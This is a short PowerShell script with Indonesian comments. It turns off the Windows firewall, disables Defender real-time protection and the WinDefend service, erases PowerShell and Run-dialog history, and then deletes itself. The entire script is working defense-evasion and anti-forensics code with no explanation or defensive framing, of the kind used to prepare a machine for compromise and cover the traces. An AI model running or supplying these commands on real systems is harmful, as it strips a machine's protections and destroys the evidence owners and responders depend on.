# Matikan Firewall
netsh advfirewall set allprofiles state off

# Nonaktifkan Real-time Protection
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
} catch {}

# Stop & disable Windows Defender service
sc.exe stop WinDefend
sc.exe config WinDefend start= disabled

# Bersihkan jejak PowerShell
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History

# Hapus Run history
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue

# Delay sejenak
Start-Sleep -Seconds 2

# Hapus diri sendiri (kalau dijalankan sebagai file)
$scriptPath = $MyInvocation.MyCommand.Path
if (Test-Path $scriptPath) {
    cmd /c "timeout 3 & del `"$scriptPath`""
}
